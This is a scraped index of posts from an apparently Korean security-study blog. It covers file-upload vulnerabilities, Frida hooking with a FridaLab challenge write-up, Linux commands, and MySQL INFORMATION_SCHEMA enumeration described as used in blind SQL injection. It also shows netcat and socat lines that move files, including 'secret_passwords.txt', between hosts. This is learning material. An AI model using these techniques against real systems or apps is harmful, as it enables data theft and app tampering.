가장좋음\n","permalink":"https://crackernote.github.io/posts/2022-07-16-file-upload-%EC%B7%A8%EC%95%BD%EC%A0%90/","summary":"1️⃣ File Upload 취약점 정리 📜File Upload 취약점 - 서버에 악성스크립트 업로드 하는것\n- web server에 업로드 할수 있느냐, WAS에 업로드하느냐가 엄청큰 차이다.\n- PHP기반웹사이트이면 – PHP 파일 업로드\n- ASP – ASP 기반 파일 업로드…\n- JSP – JSP 기반 파일업로드.. 처리기 매핑에서 매핑되는 것들이 모두된다.\n- 만약에 업로드후 열어봤을때 실행되지 않는다면??? à 텍스트로 뿌려주거나, 바이너리 파일로 다운로드된다.\n- 컨설팅 과정\n파일업로드 가능여부 확인(메뉴확인)\n이미지 파일 업로드 후 경로 확인(허가된 파일) – Jpg,Gif…","title":"File Upload 취약점"},{"content":"1️⃣ Frida 기본 📜Frida? Ole가 개발한 DBI(Dynamic Binary Instrumention) 프레임 워크 (* Instrumentation : 앱이 실행중인 상태에서 코드 명령어를 삽입해 프로세스를 추적, 분석, 디버깅하는 도구) 📜Frida 특징 다양한 플랫폼에서 프로세스에 대한 인젝션이 가능해 큰 확장성을 가짐\n윈도우, 맥OS, GNU/Linux, iOS, Android 및 QNX에서 자바스크립트를 네이티브 앱에 삽입가능\n📜Frida 주요기능 함수 후킹 (특정 함수에 연결하여 반환 값 변경, 함수 재작성 등) 애플리케이션 디버깅 가능 힙 메모리 내 객체 인스턴스 검색 및 사용 실시간 트래픽 스니핑 또는 암호 해독 탈옥 또는 루팅되지 않은 단말기에서도 가능 📜동작방식 📜Frida Tools frida (frida -h)\nFrida CLI인 REPL 인터페이스로, 신속한 프로토타이핑과 손쉬운 디버깅이 목표인 도구\n\u0026ldquo;frida -h\u0026rdquo; 명령어로 옵션 확인가능\n옵션 설명 \u0026ndash;version 프리다 프로그램 버전 출력 -h, \u0026ndash;help 도움말 메시지 출력 -D ID, \u0026ndash;device=ID 주어진 ID로 장치에 연결 -U, \u0026ndash;usb USB 장치에 연결 -R, \u0026ndash;remote 원격 프리다 서버에 연결 -H Host, \u0026ndash;host=Host Host의 원격 프리다리다 서버에 연결 -a, \u0026ndash;application 애플리케이션 리스트만 출력 -i, \u0026ndash;installed 설치된 모든 애플리케이션 포함 출력 -l SCRIPT, \u0026ndash;load=SCRIPT SCRIPT를 로드 -f FILE, \u0026ndash;file=FILE spawn FILE \u0026ndash;no-pause 시작할 때 자동으로 메인쓰레드를 시작 frida-ps (frida-ps -h)\nFrida에 연결된 프로세스 목록을 출력하기 위한 도구\n\u0026ldquo;frida-ps -h\u0026rdquo; 명령어로 옵션 확인가능\n옵션 설명 \u0026ndash;version Frida 프로그램 버전 출력 -a, \u0026ndash;application 애플리케이션 리스트만 출력 -D ID, \u0026ndash;device=ID 주어진 ID로 장치에 연결 -H HOST, \u0026ndash;host=HOST HOST의 원격 프리다 서버에 연결 -h, \u0026ndash;help 도움말 메시지 출력 -i, \u0026ndash;installed 설치된 모든 애플리케이션 포함 출력 -R, \u0026ndash;remote 원격 Frida 서버에 연결 -U, \u0026ndash;usb USB 장치에 연결 frida-ls-devices (frida-ps -h)\n연결된 디바이스를 출력하는 도구 frida-trace (frida-trace -h)\n함수 호출을 동적으로 추적하기 위한 도구\n\u0026ldquo;frida-trace -h\u0026rdquo; 명령어로 옵션 확인가능\n옵션 설명 \u0026ndash;version Frida 프로그램 버전 출력 -h, \u0026ndash;help 도움말 메시지 출력 -D ID, \u0026ndash;device=ID 주어진 ID로 장치에 연결 -U, \u0026ndash;usb USB 장치에 연결 -R, \u0026ndash;remote 원격 Frida 서버에 연결 -H HOST, \u0026ndash;host=HOST HOST의 원격 프리다 서버에 연결 -I MODULE, \u0026ndash;include-module=MODULE MODULE 포함하여 실행 -X MODULE, \u0026ndash;exclude-module=MODULE MODULE 배제하고 실행 -i FUNCTION, \u0026ndash;include-module=FUNCTION FUNCTION 포함하여 실행 -x FUNCTION, \u0026ndash;exclude-module=FUNCTION FUNCTION 배제하고 실행 frida-kill\n프로세스를 종료하는 도구 📜Frida Script Frida 에서 제공하는 스크립트 API (Javscript, C, SWIFT API) Javascript API 기본 뼈대 구조 Java.perform(function(){}) (현재 스레드가 가상머신에 연결되어 있는지 확인하고, 연결되어 있다면 function을 호출)\nJava.perform(function(){\r/*\r...\rdo sth\r...\r*/\r}) Java.use(className)\n자바스크립트 Wrapper를 ClassName에 동적으로 가져와서 생성자를 호출하기 위해 $new()를 호출하여 객체를 인스턴스화함 Static, Non-Static 메소드를 사용할 수 있음 메소드 구현을 변경할 수 있고 예외를 적용할 수 있음 var myClass = Java.use(com.mypackage.name.class) // 앱에서 사용하는 클래스와 연동되는 myclass를 정의\rvar myClassInstance = myclass.$new(); // myClass를 통해 객체 인스턴스 생성 및 정의\rvar result = myClassInstance.myMethod(\u0026#34;param\u0026#34;) // 클래스 내부에 있는 메소드에 접근해 인자 값을 넘겨주고 해당 결과 값을 result에 받음\rmyClass.myMethod.implementation = function(param){ // 앱에서 정의된 메소드의 구현 내용을 재작성 할 수 있음\r// do sth\r} 메소드 재구현 시, 주의점!! (다음의 경우에는 Overload() 를 사용하여 재구현 해야 한다.) 1. 입력받은 인수가 없는 메소드\rmyClass.myMethod.overload().implementation = function() {\r// do sth\r}\r2. 두개의 바이트 배열을 인수로 입력받는 메소드\rmyClass.myMethod.overload(\u0026#34;[B\u0026#34;,\u0026#34;[B\u0026#34;).implementation = function(param1, param2){\r// do sth\r}\r3. 앱의 Context와 Boolean 형태의 인수로 입력받는 메소드\rmyClass.myMethod.overload(\u0026#34;android.context.Context\u0026#34;, \u0026#34;boolean\u0026#34;).implementation = function(param1, param2){\r// do sth\r} ","permalink":"https://crackernote.github.io/posts/2022-07-16-frida/","summary":"1️⃣ Frida 기본 📜Frida? Ole가 개발한 DBI(Dynamic Binary Instrumention) 프레임 워크 (* Instrumentation : 앱이 실행중인 상태에서 코드 명령어를 삽입해 프로세스를 추적, 분석, 디버깅하는 도구) 📜Frida 특징 다양한 플랫폼에서 프로세스에 대한 인젝션이 가능해 큰 확장성을 가짐\n윈도우, 맥OS, GNU/Linux, iOS, Android 및 QNX에서 자바스크립트를 네이티브 앱에 삽입가능\n📜Frida 주요기능 함수 후킹 (특정 함수에 연결하여 반환 값 변경, 함수 재작성 등) 애플리케이션 디버깅 가능 힙 메모리 내 객체 인스턴스 검색 및 사용 실시간 트래픽 스니핑 또는 암호 해독 탈옥 또는 루팅되지 않은 단말기에서도 가능 📜동작방식 📜Frida Tools frida (frida -h)","title":"Frida Basic"},{"content":"1️⃣ Frida 환경세팅 📜Frida 환경 녹스 앱 플레이어 (NoX) : samsung SM-G965N 아나콘다 (python) : 프리다는 Python 기반으로 작동하기 때문에 독립된 환경을 제공하는 아나콘다가 편리함 프리다 (12.6.11) 프리다 서버 (Android)(Server 12.6.11) Jadx 1.1.0 : Dex to Java decompiler Target App : 분석 할 앱들.. ","permalink":"https://crackernote.github.io/posts/2022-07-16-frida-%ED%99%98%EA%B2%BD%EC%84%B8%ED%8C%85/","summary":"1️⃣ Frida 환경세팅 📜Frida 환경 녹스 앱 플레이어 (NoX) : samsung SM-G965N 아나콘다 (python) : 프리다는 Python 기반으로 작동하기 때문에 독립된 환경을 제공하는 아나콘다가 편리함 프리다 (12.6.11) 프리다 서버 (Android)(Server 12.6.11) Jadx 1.1.0 : Dex to Java decompiler Target App : 분석 할 앱들.. ","title":"Frida 환경세팅"},{"content":"1️⃣ FridaLab.apk WriteUp 📜FridaLab? - https://rossmarks.uk/blog/fridalab/ 에서 제공되는 Frida를 익히기 위한 Challenge APK\n📜FridaLab APP - FridaLab app을 Nox 환경에서 실행해 보면 8가지의 문제가 나오는 것을 알 수 있다.\n- 8가지 문제에 대하여 조건이 만족하면 check를 눌렀을때 색상이 Green으로 바뀐다. (조건이 만족하지 못하는 경우는 빨간색!)\n📜문제풀이 (1번) - 문제 : Change class challenge_01\u0026rsquo;s variable \u0026lsquo;chall01\u0026rsquo; to : 1 \u0026gt; 문제는 Challenge_01 클래스의 변수인 chall01의 값을 1로 바꾸라는 것이다. \u0026gt; 문제를 해결하기 위해 Jadx를 통해서 FridaLab을 분석해보자\n​\t\u0026gt; uk.rossmarks.fridalab 패키지안에 challenge_01 클래스를 확인할 수 있다. ​\t\u0026gt; 이 클래스의 변수인 값을 1로 바꿔주면 된다.\nsetImmediate(function(){ // 연결되어 있는 부분의 바로 다음을 실행 Java.perform(function(){ // 스레드가 연결되어 있으면 아래의 코드를 실행 //#1 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.challenge_01\u0026#34;); test.chall01.value = 1; console.log(\u0026#34;[*] chall01 value is \u0026#34;, test.chall01.value); }) }) \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 1번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (2번) - 문제 : Run chall02()\n\u0026gt; 문제를 보면 chall02() 함수를 실행 하라는 것이다. \u0026gt; MainActivity를 확인해보면, chall02 함수는 정의되어 있지만 사용을 하지 않는다. 따라서 MainActivity를 불러와 chall02함수를 실행해 주면 될 것이다.\n//#2 //static method일 경우 Java.use 사용 //instance method일 경우 Java.choose를 사용 Java.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;,{ onMatch : function(test){ test.chall02(); }, onComplete : function(){ console.log(\u0026#34;[*]#2 is clear\u0026#34;); } }) \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 2번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (3번) - 문제 : Make chall03() return true\n\u0026gt; 문제를 보면 chall03() 함수에서 True를 리턴하도록 만드는 것이다.\n//#3 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;); test.chall03.implementation = function(){ console.log(\u0026#34;[*]#3 is clear\u0026#34;); return true; } \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 3번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (4번) - 문제 : Send \u0026ldquo;frida\u0026rdquo; to chall04() \u0026gt; 문제를 보면 chall04() 인자값에 \u0026ldquo;frida\u0026quot;라는 문구를 보내어 함수를 실행시키도록 하는 것이다.\nJava.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;,{ onMatch : function(test){ test.chall04(\u0026#34;frida\u0026#34;); }, onComplete : function(){ console.log(\u0026#34;[*]#4 is clear\u0026#34;); } }) \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 4번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (5번) - 문제 : Always send \u0026ldquo;frida\u0026rdquo; to chall05() \u0026gt; 문제를 보면 chall05() 인자값에 \u0026ldquo;frida\u0026quot;라는 문구를 check를 누를때 마다 보내 함수를 실행시키도록 하는 것이다.\n//#5 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;); test.chall05.implementation = function(){ console.log(\u0026#34;[*]#5 is clear\u0026#34;); this.chall05(\u0026#34;frida\u0026#34;); } \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 5번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (6번) - 문제 : Run chall06() after 10 seconds with correct value \u0026gt; 문제를 보면 chall06() 함수를 check버튼을 누른뒤 10초 뒤에 실행시키는 것을 의미하는 것 같다\n//challenge 06, setTimeout(fn, delay) 필요 setTimeout(function(){ console.log(\u0026#34;[*]Click to solve the problem\u0026#34;); setImmediate(function(){ Java.perform(function(){ var chall_06 = Java.use(\u0026#34;uk.rossmarks.fridalab.challenge_06\u0026#34;); chall_06.addChall06.overload(\u0026#34;int\u0026#34;).implementation = function(arg){ Java.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;, { onMatch : function(instance){ instance.chall06(chall_06.chall06.value); }, onComplete : function(){ console.log(\u0026#34;[*]Solved Challenge 06\u0026#34;); } }) } }) }) },10000); \u0026gt; 실행 결과 프리다 실행 명령어를 통하여 스크립스 실행 : Frida -U -l fridalab.js uk.rossmakrs.fridalab 실행결과 6번문제가 해결된 것을 확인 할 수 있다.\n📜문제풀이 (7번) - 문제 : Bruteforce check07pin() then confirm with chall07()\n📜문제풀이 (8번) - 문제 : Change \u0026lsquo;check\u0026rsquo; button\u0026rsquo;s text value to \u0026lsquo;Confirm\u0026rdquo;\n📜문제풀이 정리 //fridaLab 정리 setImmediate(function(){ Java.perform(function(){ //#1 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.challenge_01\u0026#34;); test.chall01.value = 1; console.log(\u0026#34;[*] chall01 value is \u0026#34;, test.chall01.value); //#2 Java.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;,{ onMatch : function(test){ test.chall02(); }, onComplete : function(){ console.log(\u0026#34;[*]#2 is clear\u0026#34;); } }) //#3 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;); test.chall03.implementation = function(){ console.log(\u0026#34;[*]#3 is clear\u0026#34;); return true; } //#4 Java.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;,{ onMatch : function(test){ test.chall04(\u0026#34;frida\u0026#34;); }, onComplete : function(){ console.log(\u0026#34;[*]#4 is clear\u0026#34;); } }) //#5 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;); test.chall05.implementation = function(){ console.log(\u0026#34;[*]#5 is clear\u0026#34;); this.chall05(\u0026#34;frida\u0026#34;); } //#7 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.challenge_07\u0026#34;); test.check07Pin.implementation = function(){ console.log(\u0026#34;[*]#7 is clear\u0026#34;); return ture; } //#8 var test = Java.use(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;); test.chall08.implementation = function(){ console.log(\u0026#34;[*]#8 is clear\u0026#34;); return true; } }) }) //challenge 06, setTimeout(fn, delay) 필요 setTimeout(function(){ console.log(\u0026#34;[*]Click to solve the problem\u0026#34;); setImmediate(function(){ Java.perform(function(){ var chall_06 = Java.use(\u0026#34;uk.rossmarks.fridalab.challenge_06\u0026#34;); chall_06.addChall06.overload(\u0026#34;int\u0026#34;).implementation = function(arg){ Java.choose(\u0026#34;uk.rossmarks.fridalab.MainActivity\u0026#34;, { onMatch : function(instance){ instance.chall06(chall_06.chall06.value); }, onComplete : function(){ console.log(\u0026#34;[*]Solved Challenge 06\u0026#34;); } }) } }) }) },10000); ","permalink":"https://crackernote.github.io/posts/2022-07-16-fridalab.apk-writeup/","summary":"1️⃣ FridaLab.apk WriteUp 📜FridaLab? - https://rossmarks.uk/blog/fridalab/ 에서 제공되는 Frida를 익히기 위한 Challenge APK\n📜FridaLab APP - FridaLab app을 Nox 환경에서 실행해 보면 8가지의 문제가 나오는 것을 알 수 있다.\n- 8가지 문제에 대하여 조건이 만족하면 check를 눌렀을때 색상이 Green으로 바뀐다. (조건이 만족하지 못하는 경우는 빨간색!)\n📜문제풀이 (1번) - 문제 : Change class challenge_01\u0026rsquo;s variable \u0026lsquo;chall01\u0026rsquo; to : 1 \u0026gt; 문제는 Challenge_01 클래스의 변수인 chall01의 값을 1로 바꾸라는 것이다. \u0026gt; 문제를 해결하기 위해 Jadx를 통해서 FridaLab을 분석해보자","title":"FridaLab.apk WriteUp"},{"content":"1️⃣ linux 필수 Command 📜Man Pages man 📜apropos apropos 📜Listing Files ls -al 📜Moving Around cd\npwd\n📜Creating Directories mkdir\nmkdir module one\ncd module\\ one/\nmkdir -p\n📜Finding Files echo\nwhich\nlocate\nfind\n📜Managing Kali Linux Services systemctl\nSSH Service\nsudo systemctl start ssh (ssh 시작)\nsudo ss -antlp | grep sshd (ssh 구동 확인)\nsudo systemctl enable ssh (부팅시 ssh 실행)\nHTTP service\nsudo systemctl start apache2\nsudo ss -antlp | grep apache\nsudo systemctl enable apache2\nTo see a table of all available servies\nsystemctl list-unit-files 📜Searching, Installing, Removing Tools apt update \u0026gt; apt 전체 업데이트\napt upgrade \u0026gt; 특정 패키지 업그레이드\napt-cache search\napt show\napt remove \u0026ndash;purge\ndpkg \u0026gt; .deb (패키지 설치, 삭제, 정보제공을 위해 사용되는 명령어)\n📜Environment Variables echo\nexport\nenv\nhistory\n📜Redirection to a New File echo \u0026ldquo;test\u0026rdquo; \u0026gt; Redirection_test.txt 📜Redirection to an Existing File echo \u0026ldquo;test\u0026rdquo; \u0026raquo; Redirection_test.txt 📜Redirecting from a File wc wc -m \u0026lt; redirection_test.txt 📜Redirecting STDERR ls ./test 2\u0026gt;error.txt 📜Piping cat error.txt cat error.txt | wc -m cat error.txt | wc -m \u0026gt; count.txt cat count.txt 📜Text Searching and Manipulation grep (ls -la /usr/bin | grep zip) sed cut (cut -d \u0026ldquo;:\u0026rdquo; -f 1 /etc/passwd) awk (echo \u0026ldquo;hello::there::friend\u0026rdquo; | awk -F \u0026ldquo;::\u0026rdquo; \u0026lsquo;{print $1, $3}\u0026rsquo;) (=\u0026gt; hello friend) 📜Editing Files from the Command Line nano vi 📜Comparing Files comm\ndiff\nvimdiff\n📜managing process bg jobs fg ps -ef ps -fc kill 📜File and Commanding Monitoring tail\nwatch\n📜Downloading Files wget curl axel 📜Bash History Customization histcontrol histingnore histtimeformat 📜Alias alias\nlsa\nunalias\n📜Persistent bash customization bashrc 📜Others gunzip head sort uniq ","permalink":"https://crackernote.github.io/posts/2022-07-20-linux-%EA%B8%B0%EC%B4%88/","summary":"1️⃣ linux 필수 Command 📜Man Pages man 📜apropos apropos 📜Listing Files ls -al 📜Moving Around cd\npwd\n📜Creating Directories mkdir\nmkdir module one\ncd module\\ one/\nmkdir -p\n📜Finding Files echo\nwhich\nlocate\nfind\n📜Managing Kali Linux Services systemctl\nSSH Service\nsudo systemctl start ssh (ssh 시작)\nsudo ss -antlp | grep sshd (ssh 구동 확인)\nsudo systemctl enable ssh (부팅시 ssh 실행)\nHTTP service\nsudo systemctl start apache2\nsudo ss -antlp | grep apache","title":"linux 필수 command"},{"content":"1️⃣ MySQL MySQL의 Database, INFORMATION_SCHEMA를 사용하여 데이터베이스에 접근하는 방법에 대해 설명합니다.\n📜Database Database: 필요한 데이터를 유기적으로 결합하여 저장한 집합체: 통합된 정보들을 저장하여 운영할 수 있는 공용 데이터들의 묶음 데이터베이스는(Database) 여러 사람이 공유하여 사용할 목적으로 통합, 관리하는 데이터의 집합입니다. 새로운 환경에서도 기존의 데이터를 효율적으로 사용할 수 있도록 데이터를 구조화하여 저장한 것입니다.\n📜MySQL SQL은 Structured Query Language의 약자입니다. SQL은 데이터베이스에서 데이터를 정의, 조작, 제어하기 위해 사용하는 언어입니다. 그 중에서도 이 포스트는 MySQL 8.0에 대해 설명합니다.\nMySQL은 Oracle과 더불어 가장 널리 사용되고 있는 데이터베이스 관리 시스템입니다. 다른 프로그래밍언어가 프로그램을 제작하기 위한 것이라고 한다면 SQL은 데이터베이스에 접근하기 위한 것이라고 할 수 있습니다.\nMySQL의 구조는 다음과 같이 간단히 나타낼 수 있습니다.\nDatabase Server ⊃ Database ⊃ Table(Field) ⊃ Column ⊃ Record\n데이터베이스 서버 안에는 데이터베이스들이 있고, 데이터 베이스 안에는 테이블들이 있습니다. 그리고 테이블들은 칼럼(열)마다 레코드를 보관하고 있습니다.\nMySQL을 이용해서 Database에 접근하는 법은 다음과 같습니다.\nSELECT * FROM TERADA_TABLE; 위와 같은 코드(Code)를 Query, 쿼리문이라고 합니다. 사용자는 MySQL의 문법에 따라 Query를 작성하고, 이를 통해 데이터의 입출력, 조작, 조회 등을 할 수 있습니다. MySQL의 다양한 문법은 이곳에서 찾아 볼 수 있습니다.\n📜INFORMATION_SCHEMA 데이터베이스의 양이 방대해지고, 그 데이터들을 효율적으로 관리하기위해서 메타데이터(Metadata)라는 것이 존재합니다. 메타데이터는 쉽게 말하자면 데이터의 데이터, 정보들에 관한 정보입니다.\nMySQL은 INFORMATION_SCHEMA라는 이름의 데이터베이스에 메타데이터를 저장하고 있습니다. 이 INFORMATION_SCHEMA에는 데이터베이스, 테이블, 컬럼(column)의 이름, 컬럼의 데이터 타입, 접근 권한 등 아주 민감하고 중요한 정보가 들어있습니다.\n이하부터는 INFORMATION_SCHEMA에 접근하여 그 정보들을 열람하는 방법에 대해 설명합니다.\n예제는 다음과 같은 Database에서 진행합니다.\nDatabase Server\r└ information_schema\r└ performance_schema\r└ sys\r└ mysql\r└ COUNTRIES\r└ KOREA\r-------------------------------------\r| CITY_NAME | TAG | IS_VISIT |\r| --------- | --------- | -------- |\r| SEOUL | CAPITAL | 1 |\r| JEJU | MANDARINE | 1 |\r| BUSAN | SEAGULL | 0 |\r-------------------------------------\r└ JAPAN\r-------------------------------------\r| CITY_NAME | VILLAGE | IS_VISIT |\r| --------- | ------- | -------- |\r| TOKYO | SIBUYA | 1 |\r| OSAKA | NANBA | 0 |\r| FUKUOKA | HAKATA | 1 |\r-------------------------------------\r└ USA\r----------------------------------------\r| STATE_NAME | BASEBALL | IS_VISIT |\r| ----------- | -------- | -------- |\r| ILLINOIS | CUPS | 1 |\r| NEW YORK | METS | 0 |\r| LOS ANGELES | DODGERS | 1 | Note : COUNTRIES 는 데이터베이스의 이름입니다. 이외에는 시스템 데이터베이스입니다.\n1. 데이터베이스 조회 데이터베이스 서버 내의 데이터베이스의 이름을 조회할 수 있습니다.\n\u0026gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\r\u0026gt; ------------------------------\r| SCHEMA_NAME |\r| -------------------- | | INFORMATION_SCHEMA |\r| PERFORMANCE_SCHEMA |\r| MYSQL | | SYS |\r| COUNTRIES |\r------------------------------ Note:SHOW DATABASE;또한 위와 같은 결과를 보입니다.\nNote:INFORMATION_SCHEMA.SCHEMATA에는 데이터베이스이름(SCHEMA_NAME)이외의 칼럼도 있습니다.\n2. 테이블 조회 데이터베이스명을 알아내었다면 데이터베이스 내의 테이블의 정보 또한 획득할 수 있습니다.\n\u0026gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=\u0026#34;COUNTIRES\u0026#34;;\r\u0026gt; ----------------------\r| TABLE_NAME |\r| ---------- | | KOREA |\r| JAPAN |\r| USA | ---------------------- Note: INFORMATION_SCHEMA.TABLE에서 TABLE_SCHEMA는 해당 테이블이 속한 DB를 가리킵니다.\n다음과 같이 출력 결과를 필터링할 수도 있습니다.\n\u0026gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=\u0026#34;COUNTIRES\u0026#34; LIMIT 0,1;\r\u0026gt; ---------------------\r| TABLE_NAME |\r| ---------- | | KOREA |\r---------------------\r\u0026gt; SELECT MAX(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=\u0026#34;COUNTIRES\u0026#34;;\r\u0026gt; ---------------------\r| TABLE_NAME |\r| ---------- | | USA |\r--------------------- Note: 실제로 위와같은 방법이 Blind SQL Injection에서 사용됩니다.\n위와 같은 방법을 통해 USE COUNTRIES;SHOW TABLES;을 사용하지 않고 데이터베이스 내의 테이블을 조회할 수 있습니다. INFORMATION_SCHEMA.TALBES 에는 테이블명(TABLE_NAME) 뿐만 아니라 테이블의 행 수(TABLE_ROWS) 같은 정보도 포함되어있습니다.\n3. 컬럼 조회 테이블에 접근했다면 이제 테이블 속에 어떤 컬럼들이 있는지 확인할 수 있습니다. 이번엔 조금 다른 방식으로 데이터베이스를 특정해보겠습니다.\n\u0026gt; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA!=\u0026#34;INFORMATION_SCHEMA\u0026#34; AND TABLE_SCHEMA!=\u0026#34;PERFORMANCE_SCHEMA\u0026#34; AND TABLE_SCHEMA!=\u0026#34;MYSQL\u0026#34; AND TABLE_SCHEMA!=\u0026#34;SYS\u0026#34;;\r\u0026gt; ----------------------\r| COLUMN_NAME |\r| ---------- | | CITY_NAME |\r| STATE_NAME |\r| TAG |\r| VILLAGE |\r| BASEBALL |\r| IS_VISIT |\r---------------------- 메타데이터 데이터베이스 이외의 데이터베이스를 선택함으로서 사용중인 데이터베이스를 특정하였고, INFORMATION_SCHEMA.COLUMNS가 가지고 있는 정보 중 컬럼명(COLUMN_NAME)만을 획득하였습니다. 하지만 이것은 데이터베이스 내의 모든 컬럼명을 가져오는 것으로 테이블마다 컬럼명이 다르다면 어떤 컬럼이 어떤 테이블에 속해 있는지 알 수 없을 것입니다. 따라서 특정한 테이블의 컬럼명을 가져오기 위해서 다음과 같은 Query를 작성할 수 있습니다.\n\u0026gt; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\u0026#34;JAPAN\u0026#34;;\r\u0026gt; ----------------------\r| COLUMN_NAME |\r| ---------- | | CITY_NAME |\r| VILLAGE |\r| IS_VISIT |\r---------------------- 4. 레코드 조회 데이터베이스명, 테이블명, 컬럼명을 파악했다면 이제 어떤 레코드에도 접근할 수 있습니다. 위에서 조회한 정보를 바탕으로 다음과 같이 Query를 작성해 볼 수 있습니다.\n\u0026gt; SELECT CITY_NAME, VILLAGE\rFROM JAPAN;\r\u0026gt; ---------------------------\r| CITY_NAME | VILLAGE |\r| --------- | ------- |\r| TOKYO | SIBUYA |\r| OSAKA | NANBA |\r| FUKUOKA | HAKATA |\r----------------------------\r\u0026gt; SELECT VILLAGE FROM JAPAN WHERE VILLAGE IN (\u0026#39;SHINJUKU\u0026#39;,\u0026#39;SIBUYA\u0026#39;,\u0026#39;OMOTESANDO\u0026#39;,\u0026#39;HANEDA\u0026#39;);\r\u0026gt; ------------------\r| VILLAGE |\r| -------- | | SIBUYA |\r------------------ 위의 내용들을 바탕으로 다양한 SubQuery와 함께 INFORMATION_SCHEMA의 데이터를 자유롭게 열람할 수 있습니다.\n","permalink":"https://crackernote.github.io/posts/2022-07-16-mysql/","summary":"1️⃣ MySQL MySQL의 Database, INFORMATION_SCHEMA를 사용하여 데이터베이스에 접근하는 방법에 대해 설명합니다.\n📜Database Database: 필요한 데이터를 유기적으로 결합하여 저장한 집합체: 통합된 정보들을 저장하여 운영할 수 있는 공용 데이터들의 묶음 데이터베이스는(Database) 여러 사람이 공유하여 사용할 목적으로 통합, 관리하는 데이터의 집합입니다. 새로운 환경에서도 기존의 데이터를 효율적으로 사용할 수 있도록 데이터를 구조화하여 저장한 것입니다.\n📜MySQL SQL은 Structured Query Language의 약자입니다. SQL은 데이터베이스에서 데이터를 정의, 조작, 제어하기 위해 사용하는 언어입니다. 그 중에서도 이 포스트는 MySQL 8.","title":"MySQL"},{"content":"1️⃣ Practical Tools 📜Netcat tcp , udp protocol 사용\nConnecting tcp/udp port\nnc -nv 10.11.0.22 4444 Listening on a TCP/UDP Port\nnc -nlvp 4444 Transferring Files w/ Netcat\nnc -nlvp 4444 \u0026gt; incoming.exe nc -nv 10.11.0.22 4444 \u0026lt; /usr/share/windows-resources/binaries/wget.exe 📜Socat Connecting\nsocat - TCP4:\u0026lt;remote server\u0026rsquo;s ip address\u0026gt;:80 Listening\nsudo socat TCP4-LISTEN:443 STDOUT File Transfers\nsudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt 📜Powershell and powercat 📜Wireshark 📜Tcpdump ","permalink":"https://crackernote.github.io/posts/2022-07-20-practical-tools/","summary":"1️⃣ Practical Tools 📜Netcat tcp , udp protocol 사용\nConnecting tcp/udp port\nnc -nv 10.11.0.22 4444 Listening on a TCP/UDP Port\nnc -nlvp 4444 Transferring Files w/ Netcat\nnc -nlvp 4444 \u0026gt; incoming.exe nc -nv 10.11.0.22 4444 \u0026lt; /usr/share/windows-resources/binaries/wget.exe 📜Socat Connecting\nsocat - TCP4:\u0026lt;remote server\u0026rsquo;s ip address\u0026gt;:80 Listening\nsudo socat TCP4-LISTEN:443 STDOUT File Transfers\nsudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt 📜Powershell and powercat 📜Wireshark 📜Tcpdump ","title":"Practical Tools"},{"content":"1️⃣ Reversing 기초 📜CPU 아키텍처 - CISC (복합 명령어 집합 구조) - 메모리 용량을 적게 차지하는 프로그램을 구성할 수 있도록 설계된 프로세스 - 소규모 라인의 프로그램으로 많은 작업을 수행하기 위해, 강력한 명령어를 명령어 집합에 포함 - 가변 명령어 형식과 길이, 많은 명령어 종류, 복잡한 주소 지정 방식, 복잡한 회로 구성 - 인텔 계열의 프로세서(X86/64)\n- RISC (축약 명령어 집합 구조) - 적은 수의 컴퓨터 명령어를 수행하도록 설계된 프로세서 - 단순하지만 더 빨리 실행되는 소수의 명령어를 사용하는 아키텍처 - 복잡하고 강력한 명령어 집합은 오히려 간단한 명령어의 해석과 실행 시간까지 증가시킴 \u0026raquo; CISC - 단순 명령어, 짧은 사이클 시간, 적재 및 저장 구조, 고정길이 명령어, 단순명령어 형식, 제한된 종류의 주소 지정 방식 - MIPS, ARM - IoT 디바이스 및 스마트폰에서 사용\n📜메인 메모리 - 실행될 프로그램과 데이터가 CPU에 가기전에 잠시 머무는 장소 - 직접 접근 저장매체(DASD), 읽기/쓰기, 휘발성 - 모든 프로그램이 실행되려면 반드시 메모리를 거쳐야 한다. - 체감 컴퓨터 속도 : CPU성능 + 메모리 성능(용량)\n📜가상 기억 장치의 필요성 - 메인 메모리 용량 8GB에 게임 프로그램 20GB를 올릴 수 없다. - 메모리 관리 요구사항 - 다수의 프로세스가 